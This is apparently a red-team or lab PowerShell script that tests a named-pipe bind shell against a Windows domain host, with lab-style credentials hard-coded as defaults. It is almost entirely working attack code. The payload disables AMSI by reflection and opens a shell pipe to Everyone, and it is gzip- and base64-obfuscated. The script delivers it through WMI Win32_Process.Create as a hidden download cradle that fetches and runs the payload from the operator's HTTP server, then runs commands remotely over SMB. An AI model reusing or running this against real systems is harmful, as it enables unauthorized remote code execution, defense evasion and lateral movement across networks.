param(
    [string]$Target     = "10.3.10.22",
    [string]$Username   = "NORTH\hodor",
    [string]$Password   = "hodor",
    [string]$OperatorIP = "10.3.10.157",
    [int]   $Port       = 8080,
    [int]   $WaitSecs   = 50
)

$root      = Split-Path -Parent $PSScriptRoot
$pipeName  = "BST_" + (-join ((65..90)+(97..122) | Get-Random -Count 12 | % { [char]$_ }))
$endMarker = "BSTEST_" + (-join ((65..90) | Get-Random -Count 6 | % { [char]$_ }))
$bufSize   = 65536
$domain    = $Username.Split('\')[0]
$user      = $Username.Split('\')[-1]

Write-Host "[*] PipeName  : $pipeName" -ForegroundColor Cyan
Write-Host "[*] EndMarker : $endMarker" -ForegroundColor Cyan

# Build bind shell payload
$rawServer = @"
[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true);
[void][Reflection.Assembly]::LoadWithPartialName('System.Core');
`$sec=New-Object System.IO.Pipes.PipeSecurity;
`$sid=New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0';
`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$sid,'FullControl','Allow');
`$sec.AddAccessRule(`$ar);`$sT='System.IO.Pipes.NamedPipeSer'+'verStream';
while(`$true){
    `$ps=New-Object -TypeName `$sT -ArgumentList '$pipeName','InOut',-1,'Byte','None',$bufSize,$bufSize,`$sec;
    `$rd=New-Object IO.StreamReader(`$ps);`$wr=New-Object IO.StreamWriter(`$ps);
    `$ps.WaitForConnection();
    try{`$tm=`$rd.ReadLineAsync();if(`$tm.Wait(2000)-and`$null-ne`$tm.Result){`$cmd=`$tm.Result;break}}catch{};
    `$ps.Dispose()
}
`$cb=`$true;
while(`$true){
    if(-not `$ps.IsConnected){break}
    if(`$cb){`$cb=`$false}else{`$cmd=`$rd.ReadLine()}
    if(`$cmd-eq'exit'-or`$null-eq`$cmd){break}
    try{`$r=& ([scriptblock]::Create(`$cmd)) 2>&1|Out-String;`$r-split([char]10)|%{`$wr.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split([char]10)|%{`$wr.WriteLine(`$_)}};
    `$wr.WriteLine('$endMarker');`$wr.Flush()
}
`$ps.Dispose()
"@

$bytes    = [Text.Encoding]::UTF8.GetBytes($rawServer)
$ms       = [IO.MemoryStream]::new()
$gzs      = [IO.Compression.GzipStream]::new($ms,[IO.Compression.CompressionMode]::Compress)
$gzs.Write($bytes,0,$bytes.Length); $gzs.Close()
$b64      = [Convert]::ToBase64String($ms.ToArray())
$inlinePS = "`$gz='$b64';`$a=New-Object IO.MemoryStream(,[Convert]::FromBase64String(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CompressionMode]::Decompress);`$c=New-Object IO.MemoryStream;`$b.CopyTo(`$c);`$d=[Text.Encoding]::UTF8.GetString(`$c.ToArray());`$b.Close();`$a.Close();`$c.Close();[scriptblock]::Create(`$d).Invoke()"

$payFile  = "wmi_bs_test.ps1"
$payPath  = Join-Path $root $payFile
[IO.File]::WriteAllText($payPath, $inlinePS, (New-Object Text.UTF8Encoding $false))
Write-Host "[+] Payload written ($($inlinePS.Length) chars)" -ForegroundColor Green

# Confirm serve is running
try {
    $fetched = (New-Object Net.WebClient).DownloadString("http://127.0.0.1:$Port/$payFile")
    Write-Host "[+] Serve can deliver payload ($($fetched.Length) chars)" -ForegroundColor Green
} catch {
    Write-Host "[-] Serve not running on port $Port - aborting" -ForegroundColor Red
    Remove-Item $payPath -EA SilentlyContinue; exit 1
}

# Deliver via WMI (no active session needed)
$cradle  = "powershell -nop -ep bypass -w hidden -c iex((new-object net.webclient).downloadstring('http://${OperatorIP}:${Port}/${payFile}'))"
Write-Host "`n[*] Delivering via WMI on $Target..." -ForegroundColor Cyan

$opts = New-Object System.Management.ConnectionOptions
$opts.Username      = "$domain\$user"
$opts.Password      = $Password
$opts.Impersonation = [System.Management.ImpersonationLevel]::Impersonate
$opts.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy
$scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $opts)
try {
    $scope.Connect()
    Write-Host "[+] WMI connected to $Target" -ForegroundColor Green
    $cls    = New-Object System.Management.ManagementClass($scope, 'Win32_Process', $null)
    $result = $cls.InvokeMethod('Create', @($cradle, $null, $null))
    Write-Host "[+] Win32_Process.Create returned: $result (0=success)" -ForegroundColor Green
} catch {
    Write-Host "[-] WMI error: $_" -ForegroundColor Red
    Remove-Item $payPath -EA SilentlyContinue; exit 1
}

# Auth for pipe SMB
Write-Host "`n[*] Setting up SMB session for pipe auth..." -ForegroundColor Cyan
$nr = & net use "\\$Target\IPC`$" "/user:$domain\$user" $Password 2>&1
Write-Host "    net use: $nr" -ForegroundColor DarkGray

# Poll named pipe
Write-Host "`n[*] Polling \\$Target\pipe\$pipeName (${WaitSecs}s timeout)..." -ForegroundColor Cyan
$deadline = (Get-Date).AddSeconds($WaitSecs)
$pc = $null; $connected = $false
while ((Get-Date) -lt $deadline) {
    try {
        $pc = New-Object IO.Pipes.NamedPipeClientStream($Target, $pipeName, 'InOut')
        $pc.Connect(500)
        if ($pc.IsConnected) { $connected = $true; break }
    } catch {
        if ($pc) { $pc.Dispose(); $pc = $null }
        Write-Host "    [.] $([int]($deadline-(Get-Date)).TotalSeconds)s -- $($_.Exception.Message.Split('.')[0])" -ForegroundColor DarkGray
        Start-Sleep 2
    }
}

if ($connected) {
    Write-Host "" ; Write-Host "[+] CONNECTED via named pipe to $Target!" -ForegroundColor Green
    $sr = New-Object IO.StreamReader($pc)
    $sw = New-Object IO.StreamWriter($pc)
    function Exec([string]$c) {
        $sw.WriteLine($c); $sw.Flush()
        $out = [Text.StringBuilder]::new()
        while ($true) { $l = $sr.ReadLine(); if ($null -eq $l -or $l -eq $endMarker) { break }; $out.AppendLine($l) | Out-Null }
        $out.ToString().TrimEnd()
    }
    Write-Host "[>] whoami: $(Exec 'whoami')" -ForegroundColor Green
    Write-Host "[>] hostname: $(Exec 'hostname')" -ForegroundColor Green
    $sw.WriteLine("exit"); $sw.Flush()
    $pc.Dispose()
    Write-Host "" ; Write-Host "[+] END-TO-END BIND SHELL TEST PASSED." -ForegroundColor Green
} else {
    Write-Host "" ; Write-Host "[-] No pipe connection within $WaitSecs`s." -ForegroundColor Red
    Write-Host "    WMI launched the process but payload did not create named pipe server." -ForegroundColor Yellow
}

Remove-Item $payPath -EA SilentlyContinue
& net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null
